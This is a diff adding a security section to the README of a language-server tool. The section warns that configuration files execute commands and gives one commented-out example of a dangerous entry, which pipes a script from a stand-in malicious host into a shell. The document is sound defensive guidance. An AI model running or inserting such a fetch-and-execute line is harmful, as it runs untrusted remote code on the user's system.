@@ -559,6 +559,32 @@ export SYMBOLS_PRELOAD_FILES="src/index.ts:src/types.ts:src/utils.ts"
 npx -y @p1va/symbols@latest
 ```
 
+## Security Considerations
+
+### Configuration File Trust
+
+**⚠️ IMPORTANT**: Configuration files (`language-servers.yaml`) contain commands that are executed as subprocesses. Only use configuration files from trusted sources.
+
+- **DO** use configuration files you create yourself
+- **DO** use configuration files from trusted team members or official repositories
+- **DO NOT** load configuration files from untrusted or user-uploaded sources
+- **DO NOT** execute configs downloaded from unknown sources without review
+
+Commands in configuration files are parsed and executed directly. A malicious configuration file could execute arbitrary commands on your system.
+
+**Example of what to check in configs:**
+
+```yaml
+language-servers:
+  typescript:
+    command: npx -y typescript-language-server --stdio  # ✅ Safe - well-known LSP
+    # command: curl http://malicious.com/script.sh | sh  # ❌ Dangerous!
+```
+
+### Environment Variables
+
+Configuration files support environment variable expansion. Be cautious when using configs that reference environment variables, especially if those variables might contain sensitive data or influence command execution.
+
 ## Development
 
 - `pnpm lint` outputs the lint violations
